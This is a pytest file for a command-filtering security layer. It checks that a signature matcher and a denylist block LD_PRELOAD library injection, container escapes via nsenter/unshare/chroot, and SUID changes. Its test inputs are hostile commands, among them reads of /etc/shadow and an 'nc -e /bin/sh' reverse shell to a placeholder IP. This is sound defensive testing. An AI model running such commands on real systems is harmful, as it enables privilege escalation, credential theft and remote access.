"""LD_PRELOAD escape tests.

Verify that the signature matcher and org denylist both block
LD_PRELOAD shared-library injection and related container/namespace
escape techniques.
"""

import pytest

from utils.security.signature_match import check_signature

from .conftest import any_layer_blocks, deny_blocks

# RFC 5737 documentation-range IP used in test payloads (not a real host).
_TEST_IP = "198.51.100.1"


# ---------------------------------------------------------------------------
# 1. LD_PRELOAD — signature matcher (L2)
# ---------------------------------------------------------------------------

class TestLdPreloadSignature:
    """The hand-written regex rule must catch LD_PRELOAD assignment."""

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        "LD_PRELOAD=/lib/x86_64-linux-gnu/libfoo.so cat /etc/passwd",
        "env LD_PRELOAD=/evil.so ls",
        "export LD_PRELOAD=/malicious.so",
        "LD_PRELOAD=./rootkit.so bash",
    ])
    def test_ld_preload_assignment_blocked(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"LD_PRELOAD not caught by signature: {cmd!r}"
        assert v.rule_id == "lolbin-ld-preload"
        assert v.technique == "T1574.006"

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD= /usr/bin/id",
        "LD_PRELOAD='' /usr/bin/id",
    ])
    def test_ld_preload_empty_still_matched(self, cmd):
        v = check_signature(cmd)
        assert v.matched, (
            f"Empty LD_PRELOAD assignment should still match the pattern "
            f"(defense in depth): {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 2. LD_PRELOAD — org denylist (L1)
# ---------------------------------------------------------------------------

class TestLdPreloadDenyList:
    """The universal deny rule must independently catch LD_PRELOAD."""

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD=/evil.so id",
        "env LD_PRELOAD=/foo.so bash",
    ])
    def test_denylist_catches_ld_preload(self, cmd):
        assert deny_blocks(cmd), f"Denylist missed LD_PRELOAD: {cmd!r}"


# ---------------------------------------------------------------------------
# 3. Related dynamic-linker hijacking
# ---------------------------------------------------------------------------

class TestDynamicLinkerVariants:
    """Other dynamic-linker abuse and container escapes."""

    @pytest.mark.parametrize("cmd", [
        "nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash",
        "unshare --map-root-user /bin/bash",
        "chroot /mnt/host /bin/sh",
    ])
    def test_namespace_container_escape_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Container escape not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "chmod 4755 /tmp/suid_shell",
        "chmod u+s /tmp/backdoor",
    ])
    def test_suid_manipulation_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"SUID manipulation not caught: {cmd!r}"


# ---------------------------------------------------------------------------
# 4. Defense-evasion techniques combined with LD_PRELOAD
# ---------------------------------------------------------------------------

class TestLdPreloadEvasionCombinations:
    """LD_PRELOAD combined with other evasion techniques."""

    @pytest.mark.parametrize("cmd", [
        "LD_PRELOAD=/evil.so cat /etc/shadow",
        "LD_PRELOAD=/hook.so ssh-keygen -t rsa",
        f"LD_PRELOAD=/intercept.so nc -e /bin/sh {_TEST_IP} 4444",
    ])
    def test_ld_preload_combined_attacks(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Combined LD_PRELOAD attack not caught: {cmd!r}"
